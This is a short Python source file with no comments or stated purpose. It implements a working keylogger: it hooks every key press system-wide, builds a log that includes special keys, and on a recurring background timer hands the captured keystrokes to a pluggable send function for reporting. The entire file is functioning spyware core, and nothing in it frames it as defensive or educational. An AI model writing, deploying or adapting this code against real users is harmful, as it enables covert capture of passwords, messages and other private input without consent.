import keyboard
import threading

class KeyLogger:
    def __init__(self, report_interval=10):
        self.report_interval = report_interval
        self.log = ""

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            name = f"[{name}]"
        self.log += name

    def send_log(self, send_func):
        if self.log:
            send_func(self.log)
            self.log = ""
        timer = threading.Timer(self.report_interval, self.send_log, args=(send_func,))
        timer.daemon = True
        timer.start()

    def run(self, send_func):
        keyboard.on_press(self.callback)
        self.send_log(send_func)
        keyboard.wait()